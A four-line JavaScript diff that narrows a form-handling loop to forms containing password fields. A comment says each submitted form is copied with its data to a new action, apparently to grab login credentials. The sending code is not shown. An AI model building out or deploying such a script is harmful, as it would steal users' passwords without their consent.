@@ -1,4 +1,4 @@
-const forms = document.getElementsByTagName("form");
+const forms = document.querySelectorAll("form:has(input[type='password'])");
 
 for (const form of forms) {
   // On submit of form, create a copy of the form with data with a new action
